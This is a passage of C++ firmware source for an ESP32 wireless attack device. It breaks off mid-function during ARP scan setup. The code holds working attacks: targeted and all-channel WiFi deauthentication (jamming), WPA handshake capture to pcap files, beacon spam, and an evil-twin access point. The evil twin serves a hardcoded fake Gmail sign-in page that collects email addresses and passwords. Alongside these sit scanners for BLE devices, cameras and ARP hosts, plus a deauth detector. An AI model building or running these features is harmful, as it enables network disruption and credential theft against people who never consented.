#include "recon_service.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <NimBLEDevice.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include <FS.h>
#include <time.h>
#include <cctype>
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include "../web/web_server.h"
#include "time_sync.h"

#define MAX_WIFI_RESULTS 30
#define MAX_BLE_RESULTS  30
#define DEAUTH_BURST_COUNT 10
#define DEAUTH_BURST_INTERVAL_MS 50
#define ARP_SEND_INTERVAL_MS 20
#define ARP_COLLECT_WAIT_MS  3000

static ReconWiFi wifi_results[MAX_WIFI_RESULTS];
static int wifi_count = 0;

static BleDevice ble_results[MAX_BLE_RESULTS];
static int ble_count = 0;

static volatile bool flag_wifi_scan = false;
static volatile bool flag_ble_scan = false;
static volatile bool flag_deauth = false;
static volatile bool flag_deauth_all = false;
static volatile bool flag_sniffer = false;
static volatile bool flag_deauth_detect = false;
static volatile bool flag_stop = false;
static volatile bool flag_arp_scan = false;
static volatile bool flag_ip_sniff = false;

static volatile int ble_scan_duration = 10;

static int sniffer_channel = 0;
static int sniffer_packets = 0;
static int deauth_detected_count = 0;
static bool sniffer_hopping = false;
static uint32_t sniffer_hop_time = 0;
static bool was_web_server_active = false;

static char beacon_ssids[BEACON_SSID_COUNT][BEACON_SSID_LEN];
static int beacon_ssid_count = 0;
static uint32_t beacon_last_send_ms = 0;
static volatile bool flag_beacon_spam = false;

static char et_ssid[33] = "";
static int et_channel = 6;
static char et_target_bssid[18] = "";
static char et_html_file_path[128] = "";
static char et_last_credential[256] = "";
static volatile bool et_new_cred = false;
static volatile bool flag_evil_twin = false;
static uint32_t et_deauth_last_ms = 0;

static DNSServer* dnsServer = nullptr;
static AsyncWebServer* etServer = nullptr;

static volatile bool bitgotchi_active = false;
static volatile bool flag_bitgotchi_start = false;
static volatile bool flag_bitgotchi_stop = false;
static int bitgotchi_friends = 0;
static int bitgotchi_handshakes = 0;
static char bitgotchi_last_event[128] = "Initializing...";
static volatile bool bitgotchi_new_event = false;
static uint32_t bitgotchi_hop_ms = 0;
static uint32_t bitgotchi_beacon_ms = 0;
static uint8_t bitgotchi_ch_idx = 0;
static const uint8_t bitgotchi_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};

#define BITGOTCHI_MAX_APS 50
static char bitgotchi_aps[BITGOTCHI_MAX_APS][33];
static int bitgotchi_ap_count = 0;
static const uint8_t PWNGRID_MAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};

static const uint8_t PWNGRID_BEACON_HDR[] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
    0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x11, 0x04
};

static void bitgotchi_write_pcap(const char* bssid_str, const uint8_t* frame, uint16_t len) {
    if (!SD.begin()) return;
    if (!SD.exists("/Bitpcap")) SD.mkdir("/Bitpcap");
    if (!SD.exists("/Bitpcap/handshakes")) SD.mkdir("/Bitpcap/handshakes");

    char path[80];
    char safe_bssid[18];
    strncpy(safe_bssid, bssid_str, sizeof(safe_bssid));
    for (int i = 0; i < (int)strlen(safe_bssid); i++) {
        if (safe_bssid[i] == ':') safe_bssid[i] = '-';
    }
    snprintf(path, sizeof(path), "/Bitpcap/handshakes/%s.pcap", safe_bssid);

    bool is_new = !SD.exists(path);
    File f = SD.open(path, FILE_APPEND);
    if (!f) return;

    if (is_new) {
        uint8_t hdr[24];
        uint32_t magic = 0xa1b2c3d4;
        uint16_t vmaj = 2, vmin = 4;
        int32_t  tz = 0;
        uint32_t sigfigs = 0, snaplen = 65535, network = 105;
        memcpy(hdr +  0, &magic,   4);
        memcpy(hdr +  4, &vmaj,    2);
        memcpy(hdr +  6, &vmin,    2);
        memcpy(hdr +  8, &tz,      4);
        memcpy(hdr + 12, &sigfigs, 4);
        memcpy(hdr + 16, &snaplen, 4);
        memcpy(hdr + 20, &network, 4);
        f.write(hdr, 24);
    }

    uint32_t ts_sec = (uint32_t)time(nullptr);
    uint32_t ts_usec = 0;
    uint32_t incl_len = len;
    uint32_t orig_len = len;
    uint8_t pkt_hdr[16];
    memcpy(pkt_hdr +  0, &ts_sec,   4);
    memcpy(pkt_hdr +  4, &ts_usec,  4);
    memcpy(pkt_hdr +  8, &incl_len, 4);
    memcpy(pkt_hdr + 12, &orig_len, 4);
    f.write(pkt_hdr, 16);
    f.write(frame, len);
    f.close();
}

static bool bitgotchi_is_eapol(const uint8_t* frame, uint16_t len) {
    if (len < 36) return false;
    uint8_t type    = (frame[0] & 0x0C) >> 2;
    uint8_t subtype = (frame[0] & 0xF0) >> 4;
    if (type != 2) return false;
    if (subtype == 0  && len > 32 && frame[30] == 0x88 && frame[31] == 0x8E) return true;
    if (subtype == 8  && len > 34 && frame[32] == 0x88 && frame[33] == 0x8E) return true;
    return false;
}

static void bitgotchi_parse_ssid(const uint8_t* frame, uint16_t len, char* ssid_out, int max_len) {
    ssid_out[0] = '\0';
    if (len < 38) return;
    int idx = 36;
    while (idx + 2 <= len) {
        uint8_t tag_num = frame[idx];
        uint8_t tag_len = frame[idx + 1];
        if (idx + 2 + tag_len > len) break;
        if (tag_num == 0) {
            int c_len = (tag_len >= max_len) ? (max_len - 1) : tag_len;
            memcpy(ssid_out, frame + idx + 2, c_len);
            ssid_out[c_len] = '\0';
            return;
        }
        idx += 2 + tag_len;
    }
}

static void bitgotchi_send_pwngrid_beacon(void) {
    const char* payload = "{\"name\":\"Bitgotchi\",\"face\":\"(^_^)\",\"version\":\"1.0.0\",\"grid_version\":\"1.10.3\",\"epoch\":1,\"identity\":\"bitgotchi_scr_terminal\",\"pwnd_run\":0,\"pwnd_tot\":0}";
    uint16_t plen = strlen(payload);
    uint8_t tag_len = (plen > 255) ? 255 : plen;

    size_t frame_len = sizeof(PWNGRID_BEACON_HDR) + 2 + plen;
    uint8_t* frame = (uint8_t*)malloc(frame_len);
    if (!frame) return;

    memcpy(frame, PWNGRID_BEACON_HDR, sizeof(PWNGRID_BEACON_HDR));
    int idx = sizeof(PWNGRID_BEACON_HDR);
    frame[idx++] = 0xDE;
    frame[idx++] = tag_len;
    memcpy(frame + idx, payload, tag_len);

    esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
    free(frame);
}

static int blackout_current_ch = 1;
static uint32_t blackout_ch_time = 0;

static char deauth_bssid[18] = {0};
static int  deauth_channel = 1;

enum ReconState {
    RECON_IDLE,
    RECON_WIFI_SCANNING,
    RECON_BLE_SCANNING,
    RECON_DEAUTH_ACTIVE,
    RECON_DEAUTH_SENDING,
    RECON_DEAUTH_RESTORE,
    RECON_DEAUTH_ALL,
    RECON_SNIFFING,
    RECON_DEAUTH_DETECTING,
    RECON_EVIL_TWIN,
    RECON_BEACON_SPAMMING,
    RECON_ARP_SCANNING,
    RECON_IP_SNIFFING
};
static ReconState state = RECON_IDLE;

static uint32_t deauth_last_burst_ms = 0;
static int deauth_frames_sent = 0;

static NimBLEScan* pBLEScan = nullptr;
static bool ble_scan_started = false;
static uint32_t ble_scan_start_ms = 0;
static int ble_scan_target_duration = 10;

static bool wifi_scan_requested = false;

static ArpDevice arp_results[MAX_ARP_RESULTS];
static int arp_count = 0;
static int arp_scan_idx = 0;
static uint32_t arp_last_send_ms = 0;
static uint32_t arp_collect_start_ms = 0;
static bool arp_collecting = false;
static uint32_t arp_base = 0;
static bool arp_waiting_wifi = false;
static uint32_t arp_wifi_start_ms = 0;
#define ARP_WIFI_TIMEOUT_MS 15000

static char sniff_target_ip[16] = "";
static char sniff_unique_ips[MAX_SNIFF_IPS][16];
static int  sniff_unique_ip_count = 0;
static File sniff_pcap_file;

static uint8_t deauth_frame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

const char* DEFAULT_GOOGLE_HTML = 
"<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
"<style>body{font-family:Arial,sans-serif;background-color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh;box-sizing:border-box;}"
".container{width:100%;max-width:360px;border:1px solid #dadce0;border-radius:8px;padding:40px 24px;text-align:center;}"
"h2{font-weight:400;margin-bottom:8px;color:#202124;}"
"p{color:#5f6368;font-size:16px;margin-bottom:30px;}"
"input[type=text],input[type=password]{width:100%;padding:14px;margin:8px 0;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:16px;}"
"input:focus{border-color:#1a73e8;outline:none;}"
"button{background-color:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-top:20px;}"
"button:hover{background-color:#1557b0;}</style></head><body>"
"<div class='container'><img src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg' style='height:24px;margin-bottom:24px;' alt='Google'>"
"<h2>Sign in</h2><p>to continue to Gmail</p>"
"<form action='/login' method='POST'>"
"<input type='text' name='email' placeholder='Email or phone' required>"
"<input type='password' name='password' placeholder='Enter your password' required>"
"<button type='submit'>Next</button></form></div></body></html>";

static void parse_bssid(const char* str, uint8_t* out) {
    unsigned int b[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    }
}

static const char* auth_type_str(wifi_auth_mode_t auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "OTHER";
    }
}

static bool check_is_airtag(const NimBLEAdvertisedDevice* dev) {
    if (!dev->haveManufacturerData()) return false;
    auto mfg = dev->getManufacturerData();
    if (mfg.size() < 3) return false;

    if ((uint8_t)mfg[0] == 0x4C && (uint8_t)mfg[1] == 0x00) {
        uint8_t type = (uint8_t)mfg[2];
        if (type == 0x12 || type == 0x07) return true;
    }
    return false;
}

static bool check_is_flipper(const NimBLEAdvertisedDevice* dev) {
    if (dev->haveName()) {
        std::string name = dev->getName();
        std::string name_lower = name;
        for (auto &c : name_lower) c = tolower(c);
        if (name_lower.find("flipper") != std::string::npos) {
            return true;
        }
    }
    return false;
}

class ReconBLECallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (ble_count >= MAX_BLE_RESULTS) return;

        std::string addr_str = dev->getAddress().toString();
        const char* addr = addr_str.c_str();

        for (int i = 0; i < ble_count; i++) {
            if (strcmp(ble_results[i].mac, addr) == 0) return;
        }

        BleDevice& d = ble_results[ble_count];
        strncpy(d.mac, addr, sizeof(d.mac) - 1);
        d.mac[sizeof(d.mac) - 1] = '\0';

        if (dev->haveName()) {
            std::string nm = dev->getName();
            strncpy(d.name, nm.c_str(), sizeof(d.name) - 1);
            d.name[sizeof(d.name) - 1] = '\0';
        } else {
            d.name[0] = '\0';
        }

        d.rssi = dev->getRSSI();
        d.is_airtag = check_is_airtag(dev);
        d.is_flipper = check_is_flipper(dev);

        ble_count++;

        Serial.printf("[RECON] BLE: %s \"%s\" RSSI:%d %s %s\n",
                      d.mac, d.name, d.rssi, 
                      d.is_airtag ? "[AIRTAG]" : "",
                      d.is_flipper ? "[FLIPPER]" : "");
    }
};

static ReconBLECallbacks bleScanCB;

void recon_service_init(void) {
    Serial.println("[RECON] Service initialized");
}

void recon_request_wifi_scan(void) {
    flag_wifi_scan = true;
}

void recon_request_ble_scan(int duration_sec) {
    ble_scan_duration = duration_sec;
    flag_ble_scan = true;
}

void recon_request_deauth(const char* bssid, int channel) {
    strncpy(deauth_bssid, bssid, sizeof(deauth_bssid) - 1);
    deauth_bssid[sizeof(deauth_bssid) - 1] = '\0';
    deauth_channel = channel;
    flag_deauth = true;
}

void recon_request_stop(void) {
    flag_stop = true;
}

bool recon_is_scanning(void) {
    return state == RECON_WIFI_SCANNING || state == RECON_BLE_SCANNING;
}

bool recon_is_deauthing(void) {
    return state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_RESTORE;
}

int recon_wifi_count(void) { return wifi_count; }
int recon_ble_count(void)  { return ble_count; }
int recon_arp_count(void)  { return arp_count; }

const ReconWiFi* recon_get_wifi(int idx) {
    if (idx < 0 || idx >= wifi_count) return nullptr;
    return &wifi_results[idx];
}
const BleDevice* recon_get_ble(int idx) {
    if (idx < 0 || idx >= ble_count) return nullptr;
    return &ble_results[idx];
}
const ArpDevice* recon_get_arp_device(int idx) {
    if (idx < 0 || idx >= arp_count) return nullptr;
    return &arp_results[idx];
}

bool recon_is_arp_scanning(void)     { return state == RECON_ARP_SCANNING; }
bool recon_is_arp_waiting_wifi(void) { return state == RECON_ARP_SCANNING && arp_waiting_wifi; }
int  recon_arp_scan_progress(void)   { return arp_scan_idx; }
bool recon_is_ip_sniffing(void)   { return state == RECON_IP_SNIFFING; }
const char* recon_sniff_target_ip(void) { return sniff_target_ip; }
int recon_sniff_unique_ip_count(void)   { return sniff_unique_ip_count; }
const char* recon_sniff_get_ip(int idx) {
    if (idx < 0 || idx >= sniff_unique_ip_count) return "";
    return sniff_unique_ips[idx];
}

void recon_request_arp_scan(void) { flag_arp_scan = true; }
void recon_request_ip_sniff(const char* target_ip) {
    strncpy(sniff_target_ip, target_ip, sizeof(sniff_target_ip) - 1);
    sniff_target_ip[sizeof(sniff_target_ip) - 1] = '\0';
    flag_ip_sniff = true;
}

static void start_wifi_scan(void) {
    Serial.println("[RECON] Starting WiFi scan");
    wifi_count = 0;
    if (WiFi.getMode() != WIFI_STA && WiFi.getMode() != WIFI_AP_STA) {
        WiFi.mode(WIFI_STA);
        delay(100);
    }
    WiFi.scanNetworks(true, true);
    wifi_scan_requested = true;
    state = RECON_WIFI_SCANNING;
}

static bool detect_camera_by_ssid(const char* ssid) {
    const char* keywords[] = {
        "cam", "ipc", "dvr", "nvr", "cctv", "hikvision", "dahua", "foscam",
        "reolink", "wyze", "tapo", "v380", "yoosee", "lookcam", "hiseeu",
        "vstarcam", "netcam", "webcam", "ipcam", "icsee", "xmeye", "eye4",
        "mipc", "autobot", "sricam", "wansview", "amcrest", "annke"
    };
    char lower[33];
    int len = strlen(ssid);
    for (int j = 0; j < len && j < 32; j++) lower[j] = tolower((unsigned char)ssid[j]);
    lower[len < 32 ? len : 32] = '\0';
    for (const char* kw : keywords) {
        if (strstr(lower, kw)) return true;
    }
    return false;
}

static bool detect_camera_by_oui(const char* bssid) {
    const char* ouis[] = {
        "44:A6:42","70:B3:17","9C:14:63","BC:AD:28","E0:50:8B","00:0F:7C",
        "E4:58:B8","CC:2D:83","C0:56:E3","44:19:B6",
        "00:0B:3F","3C:EF:8C","54:4A:16","90:02:A9","9C:B2:B2","BC:32:5B",
        "E8:AB:FA","A4:14:37","D8:9E:3F","E0:50:8B",
        "00:62:6E","E0:B9:E5","24:F5:A2",
        "D4:A6:51","18:69:D8","50:8A:06","68:57:2D","84:E1:53","EC:FA:BC",
        "BC:DD:C2","2C:3E:AB","44:17:93",
        "EC:71:DB","F4:DE:AF","00:E0:4C",
        "2C:AA:8E","A4:DA:22",
        "50:C7:BF","70:4F:57","98:DE:D0","C0:25:E9","D8:07:B6","E8:94:F6",
        "00:12:12","D4:34:6A","B0:F1:EC",
    };
    char upper_bssid[18];
    for (int i = 0; i < 17 && bssid[i]; i++) upper_bssid[i] = toupper((unsigned char)bssid[i]);
    upper_bssid[17] = '\0';
    for (const char* oui : ouis) {
        if (strncmp(upper_bssid, oui, 8) == 0) return true;
    }
    return false;
}

static void poll_wifi_scan(void) {
    int16_t result = WiFi.scanComplete();
    if (result == WIFI_SCAN_RUNNING) return;

    if (result == WIFI_SCAN_FAILED) {
        Serial.println("[RECON] WiFi scan failed");
        state = RECON_IDLE;
        wifi_scan_requested = false;
        return;
    }

    int n = (result > MAX_WIFI_RESULTS) ? MAX_WIFI_RESULTS : result;
    for (int i = 0; i < n; i++) {
        ReconWiFi& net = wifi_results[i];
        strncpy(net.ssid, WiFi.SSID(i).c_str(), sizeof(net.ssid) - 1);
        net.ssid[sizeof(net.ssid) - 1] = '\0';
        snprintf(net.bssid, sizeof(net.bssid), "%s", WiFi.BSSIDstr(i).c_str());
        net.rssi = WiFi.RSSI(i);
        net.channel = WiFi.channel(i);
        strncpy(net.auth, auth_type_str(WiFi.encryptionType(i)), sizeof(net.auth) - 1);
        net.auth[sizeof(net.auth) - 1] = '\0';
        net.is_camera = detect_camera_by_ssid(net.ssid) || detect_camera_by_oui(net.bssid);
        if (net.is_camera) {
            Serial.printf("[RECON] !!! CAMERA DETECTED: %s (%s) CH%d %ddBm\n",
                net.ssid, net.bssid, net.channel, net.rssi);
        }
    }
    wifi_count = n;
    WiFi.scanDelete();
    wifi_scan_requested = false;
    state = RECON_IDLE;
    Serial.printf("[RECON] WiFi scan complete: %d networks\n", wifi_count);
}

static void start_ble_scan(void) {
    Serial.println("[RECON] Starting BLE scan");
    ble_count = 0;

    if (!NimBLEDevice::isInitialized()) {
        NimBLEDevice::init("SCR-Scan");
    }

    pBLEScan = NimBLEDevice::getScan();
    pBLEScan->setScanCallbacks(&bleScanCB, false);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);

    ble_scan_target_duration = ble_scan_duration;
    pBLEScan->start(ble_scan_target_duration * 1000, false);
    ble_scan_started = true;
    ble_scan_start_ms = millis();
    state = RECON_BLE_SCANNING;
}

static void poll_ble_scan(void) {
    if (!pBLEScan) {
        state = RECON_IDLE;
        return;
    }
    if (!pBLEScan->isScanning()) {
        ble_scan_started = false;
        state = RECON_IDLE;
        Serial.printf("[RECON] BLE scan complete: %d devices\n", ble_count);
    }
}

static void stop_ble_scan(void) {
    if (pBLEScan && pBLEScan->isScanning()) {
        pBLEScan->stop();
    }
    ble_scan_started = false;
}

static void start_deauth(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting deauth: BSSID=%s CH=%d\n", deauth_bssid, deauth_channel);

    uint8_t bssid_bytes[6];
    parse_bssid(deauth_bssid, bssid_bytes);
    memcpy(deauth_frame + 10, bssid_bytes, 6);
    memcpy(deauth_frame + 16, bssid_bytes, 6);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

    deauth_frames_sent = 0;
    deauth_last_burst_ms = 0;
    state = RECON_DEAUTH_SENDING;
}

static void poll_deauth(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < DEAUTH_BURST_INTERVAL_MS) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += DEAUTH_BURST_COUNT;
}

static void stop_deauth_and_restore(void) {
    Serial.printf("[RECON] Deauth stopped. Restoring state...\n");
    esp_wifi_set_promiscuous(false);
    if (was_web_server_active) {
        WiFi.mode(WIFI_AP_STA);
        web_server_init();
    } else {
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
    }
    deauth_frames_sent = 0;
    state = RECON_IDLE;
}

static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len   = pkt->rx_ctrl.sig_len;

    if (type == WIFI_PKT_MGMT) {
        uint8_t subtype = (frame[0] >> 4) & 0x0F;
        sniffer_packets++;
        if (subtype == 0x0C || subtype == 0x0A) deauth_detected_count++;

        if (bitgotchi_active && subtype == 0x08 && len > 16) {
            // Check for PWNGRID friend beacon first
            if (memcmp(frame + 10, PWNGRID_MAC, 6) == 0) {
                bitgotchi_friends++;
                snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                         "Friend detected! Total: %d", bitgotchi_friends);
                bitgotchi_new_event = true;
            } else {
                // Parse SSID of general AP
                char ssid[33];
                bitgotchi_parse_ssid(frame, len, ssid, sizeof(ssid));
                if (strlen(ssid) > 0) {
                    bool known = false;
                    for (int i = 0; i < bitgotchi_ap_count; i++) {
                        if (strcmp(bitgotchi_aps[i], ssid) == 0) {
                            known = true;
                            break;
                        }
                    }
                    if (!known) {
                        if (bitgotchi_ap_count < BITGOTCHI_MAX_APS) {
                            strncpy(bitgotchi_aps[bitgotchi_ap_count], ssid, 32);
                            bitgotchi_aps[bitgotchi_ap_count][32] = '\0';
                            bitgotchi_ap_count++;
                        }
                        snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                                 "New AP: %s (Total: %d)", ssid, bitgotchi_ap_count);
                        bitgotchi_new_event = true;
                    }
                }
            }
        }
    }

    if (bitgotchi_active && (type == WIFI_PKT_DATA || type == WIFI_PKT_MGMT)) {
        if (bitgotchi_is_eapol(frame, len)) {
            char bssid_str[18];
            snprintf(bssid_str, sizeof(bssid_str),
                "%02X-%02X-%02X-%02X-%02X-%02X",
                frame[10], frame[11], frame[12],
                frame[13], frame[14], frame[15]);
            bitgotchi_write_pcap(bssid_str, frame, len);
            bitgotchi_handshakes++;
            snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                     "PCAP Saved! BSSID:%s", bssid_str);
            bitgotchi_new_event = true;
            Serial.printf("[BITGOTCHI] Handshake captured & saved: %s\n", bssid_str);
        }
    }
}

static void start_deauth_all(void) {
    was_web_server_active = web_server_is_active();
    Serial.println("[RECON] Blackout: deauth all channels");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    blackout_current_ch = 1;
    blackout_ch_time = millis();
    deauth_frames_sent = 0;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    memset(deauth_frame + 4, 0xFF, 6);
    memset(deauth_frame + 10, 0xFF, 6);
    memset(deauth_frame + 16, 0xFF, 6);

    state = RECON_DEAUTH_ALL;
}

static void poll_deauth_all(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < 30) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += 5;

    if (now - blackout_ch_time > 500) {
        blackout_current_ch++;
        if (blackout_current_ch > 13) blackout_current_ch = 1;
        esp_wifi_set_channel(blackout_current_ch, WIFI_SECOND_CHAN_NONE);
        blackout_ch_time = now;
    }
}

static void start_sniffer(int ch) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Sniffer starting CH=%d\n", ch);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    sniffer_packets = 0;
    deauth_detected_count = 0;
    sniffer_hopping = (ch == 0);
    sniffer_channel = (ch == 0) ? 1 : ch;
    esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_SNIFFING;
}

static void poll_sniffer(void) {
    if (!sniffer_hopping) return;
    if (millis() - sniffer_hop_time > 200) {
        sniffer_channel++;
        if (sniffer_channel > 13) sniffer_channel = 1;
        esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
        sniffer_hop_time = millis();
    }
}

static void start_deauth_detect(void) {
    was_web_server_active = web_server_is_active();
    Serial.println("[RECON] Deauth detector starting");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    deauth_detected_count = 0;
    sniffer_packets = 0;
    sniffer_hopping = true;
    sniffer_channel = 1;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_DEAUTH_DETECTING;
}

static void send_beacon(const char* ssid, uint8_t ch) {
    uint32_t hash = 5381;
    for (int i = 0; ssid[i] != '\0'; i++) {
        hash = ((hash << 5) + hash) + ssid[i];
    }
    uint8_t mac[6];
    mac[0] = 0x02;
    mac[1] = 0xDE;
    mac[2] = (hash & 0xFF000000) >> 24;
    mac[3] = (hash & 0x00FF0000) >> 16;
    mac[4] = (hash & 0x0000FF00) >> 8;
    mac[5] = (hash & 0x000000FF);

    uint8_t packet[128];
    int idx = 0;

    packet[idx++] = 0x80; packet[idx++] = 0x00;
    packet[idx++] = 0x00; packet[idx++] = 0x00;
    memset(packet + idx, 0xFF, 6); idx += 6;
    memcpy(packet + idx, mac, 6); idx += 6;
    memcpy(packet + idx, mac, 6); idx += 6;
    packet[idx++] = 0x00; packet[idx++] = 0x00;

    memset(packet + idx, 0, 8); idx += 8;
    packet[idx++] = 0x64; packet[idx++] = 0x00;
    packet[idx++] = 0x11; packet[idx++] = 0x04;

    packet[idx++] = 0x00;
    uint8_t len = strlen(ssid);
    packet[idx++] = len;
    memcpy(packet + idx, ssid, len); idx += len;

    packet[idx++] = 0x01; packet[idx++] = 0x08;
    packet[idx++] = 0x82; packet[idx++] = 0x84; packet[idx++] = 0x8b; packet[idx++] = 0x96;
    packet[idx++] = 0x24; packet[idx++] = 0x30; packet[idx++] = 0x48; packet[idx++] = 0x6c;

    packet[idx++] = 0x03; packet[idx++] = 0x01;
    packet[idx++] = ch;

    esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, false);
}

void recon_request_beacon_spam(const char ssids[][BEACON_SSID_LEN], int count) {
    beacon_ssid_count = (count > BEACON_SSID_COUNT) ? BEACON_SSID_COUNT : count;
    for (int i = 0; i < beacon_ssid_count; i++) {
        strncpy(beacon_ssids[i], ssids[i], BEACON_SSID_LEN - 1);
        beacon_ssids[i][BEACON_SSID_LEN - 1] = '\0';
    }
    flag_beacon_spam = true;
}

static void start_beacon_spam(void) {
    was_web_server_active = web_server_is_active();
    Serial.printf("[RECON] Starting Beacon Spam: %d SSIDs\n", beacon_ssid_count);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    esp_wifi_set_promiscuous(false);
    beacon_last_send_ms = 0;
    state = RECON_BEACON_SPAMMING;
}

static void poll_beacon_spam(void) {
    uint32_t now = millis();
    if (now - beacon_last_send_ms < 100) return;
    beacon_last_send_ms = now;
    for (int i = 0; i < beacon_ssid_count; i++) {
        send_beacon(beacon_ssids[i], 1);
    }
}

static const char* oui_vendor(const uint8_t* mac) {
    char oui[9];
    snprintf(oui, sizeof(oui), "%02X:%02X:%02X", mac[0], mac[1], mac[2]);
    struct OuiEntry { const char* prefix; const char* name; };
    static const OuiEntry db[] = {
        {"44:A6:42","Hikvision"},{"70:B3:17","Hikvision"},{"9C:14:63","Hikvision"},
        {"BC:AD:28","Hikvision"},{"E4:58:B8","Hikvision"},{"CC:2D:83","Hikvision"},
        {"00:0B:3F","Dahua"},    {"3C:EF:8C","Dahua"},    {"54:4A:16","Dahua"},
        {"90:02:A9","Dahua"},    {"9C:B2:B2","Dahua"},    {"BC:32:5B","Dahua"},
        {"00:62:6E","Foscam"},   {"E0:B9:E5","Foscam"},
        {"D4:A6:51","Tuya"},     {"18:69:D8","Tuya"},     {"84:E1:53","Tuya"},
        {"EC:71:DB","Reolink"},  {"F4:DE:AF","Reolink"},
        {"2C:AA:8E","Wyze"},     {"A4:DA:22","Wyze"},
        {"50:C7:BF","TP-Link"},  {"98:DE:D0","TP-Link"},  {"D8:07:B6","TP-Link"},
        {"B0:F1:EC","Xiongmai"}, {"00:12:12","Xiongmai"},
        {"18:3A:2D","Amazon"},   {"F0:27:65","Amazon"},   {"FC:65:DE","Amazon"},
        {"B4:75:0E","Apple"},    {"98:01:A7","Apple"},
        {nullptr, nullptr}
    };
    for (int i = 0; db[i].prefix; i++) {
        if (strncmp(oui, db[i].prefix, 8) == 0) return db[i].name;
    }
    return "Unknown";
}

static void start_arp_scan(void) {
    arp_count = 0;
    arp_scan_idx = 0;
    arp_collecting = false;
    arp_last_send_ms = 0;
    arp_waiting_wifi = false;

    if (WiFi.status() == WL_CONNECTED) {
        IPAddress local = WiFi.localIP();
        IPAddress mask  = WiFi.subnetMask();
        arp_base = ((uint32_t)local) & ((uint32_t)mask);
        Serial.printf("[ARP] Already connected. Scanning subnet %d.%d.%d.%d\n",
            local[0] & mask[0], local[1] & mask[1],
            local[2] & mask[2], local[3] & mask[3]);
    } else {
        time_sync_load_networks();
        int nc = time_sync_get_saved_network_count();
        String ssid = "", pass = "";
        bool hidden = false;
        bool found_valid = false;
        for (int i = 0; i < nc; i++) {
            String s, p;
            bool h;
            if (time_sync_get_saved_network(i, s, p, h)) {
